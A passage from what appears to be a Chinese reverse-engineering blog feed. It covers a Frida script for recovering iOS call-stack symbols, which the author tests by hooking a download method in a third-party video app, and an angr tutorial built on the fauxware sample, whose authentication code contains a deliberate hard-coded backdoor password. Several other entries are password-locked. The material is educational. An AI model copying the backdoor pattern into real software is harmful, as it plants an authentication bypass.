Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>andoid调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-06-05T06:57:29.464Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Auto.js脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-04-30T02:52:18.678Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code">    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="auto.js" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/auto-js/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
